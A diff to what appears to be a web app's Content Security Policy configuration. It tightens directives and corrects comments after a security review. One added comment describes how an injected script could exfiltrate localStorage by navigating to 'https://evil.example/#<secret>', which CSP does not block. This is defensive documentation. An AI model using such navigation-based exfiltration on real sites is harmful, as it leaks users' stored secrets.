@@ -37,8 +37,12 @@ function railMcpOrigin() {
   }
 }
 
-// `connect-src` is the directive actually doing the exfiltration-blocking
-// work here: 'self' (this app's own same-origin `/api/*` proxy calls), the
+// `connect-src` is the directive doing most of the exfiltration-blocking
+// work here, but NOT all of it -- see the "what this CSP does not cover"
+// paragraph below, added for the 2026-09-26 "Repeater Signal" review's
+// finding L7 (the previous copy of this comment overstated what
+// `connect-src`/`form-action` together actually confine). `connect-src`
+// itself: 'self' (this app's own same-origin `/api/*` proxy calls), the
 // Anthropic API (components/ChatPanel.tsx's own direct
 // `new Anthropic({ dangerouslyAllowBrowser: true })` call -- the entire
 // reason the API key lives in the browser at all), and this deployment's
@@ -51,6 +55,35 @@ function railMcpOrigin() {
 // same-page fetch, so it needs no `connect-src` entry; there is no Google
 // Fonts or other CDN usage anywhere in the codebase to allow for either.
 //
+// What this CSP does NOT cover: `connect-src` governs `fetch`/`XHR`/
+// `sendBeacon`/`WebSocket`/`<img>`-style subresource requests a script
+// makes FROM this page -- it does not restrict a TOP-LEVEL navigation a
+// script itself triggers (`location.href = ...`, `location.assign(...)`,
+// `window.open(...)`, or synthesizing and clicking an `<a>`). A script that
+// got past `script-src` could still exfiltrate `localStorage` by simply
+// navigating (or opening a new tab to) `https://evil.example/#<secret>` --
+// nothing in the directives below stops that. `form-action 'self'` (kept,
+// below) is often mistaken for covering this too, but it only restricts
+// where an HTML `<form>` may submit; it has no effect on a script-driven
+// navigation that never goes through form submission at all. The CSP
+// working group did once draft a `navigate-to` directive for exactly this
+// gap, but it was dropped from the spec and ships in no current browser --
+// there is currently no standard CSP directive this app (or any app) can
+// add to close it. Closing it for real needs something CSP itself can't
+// provide -- e.g. Trusted Types' extended sink coverage for
+// `Location`/`Window.open` -- which needs a real Trusted Types policy
+// defined app-wide first (today's `dangerouslySetInnerHTML` use in
+// app/incidents/[id]/page.tsx would need one anyway); out of scope for this
+// pass, which only tightens what a static `headers()` entry can express.
+//
+// `frame-src 'none'`/`worker-src 'self'` (added alongside this comment
+// correction): this app renders no `<iframe>` anywhere (grepped for one
+// before adding this) and only ever loads one worker script, same-origin
+// (`public/sw.js`, registered by `components/ServiceWorkerRegister.tsx`) --
+// neither needs to fall back to `default-src 'self'` implicitly, so stating
+// them explicitly removes any dependence on cross-browser fallback-chain
+// behavior for two directives that are cheap to pin down precisely.
+//
 // `script-src`/`style-src` both need 'unsafe-inline', noted here as the
 // two directives most worth a follow-up review:
 //   - Mantine's `<ColorSchemeScript>` (app/layout.tsx) renders a small
@@ -61,9 +94,11 @@ function railMcpOrigin() {
 //     app has none today) -- out of scope for this pass, which only adds a
 //     static header via `headers()` below. This directive alone WOULD let
 //     an injected inline `<script>` execute, same as having no script-src
-//     at all -- but on its own it does not help exfiltrate anything; the
-//     `connect-src`/`img-src`/`form-action` restrictions here still confine
-//     where that script's own requests can go.
+//     at all -- but on its own it does not help exfiltrate anything via a
+//     `fetch`/`XHR`/`sendBeacon`/websocket/`<img>` request; the
+//     `connect-src`/`img-src` restrictions here still confine where that
+//     KIND of request can go (a top-level navigation is a separate matter
+//     -- see the paragraph above).
 //   - This app (and Mantine's own components) render plain React inline
 //     `style={{...}}` throughout -- `style-src 'self'` alone blocks every
 //     one of those under a browser that enforces CSP on the `style`
@@ -81,6 +116,8 @@ function contentSecurityPolicy() {
     "img-src 'self' data:",
     "font-src 'self'",
     `connect-src ${connectSrc}`,
+    "frame-src 'none'",
+    "worker-src 'self'",
     "frame-ancestors 'none'",
     "form-action 'self'",
     "base-uri 'self'",
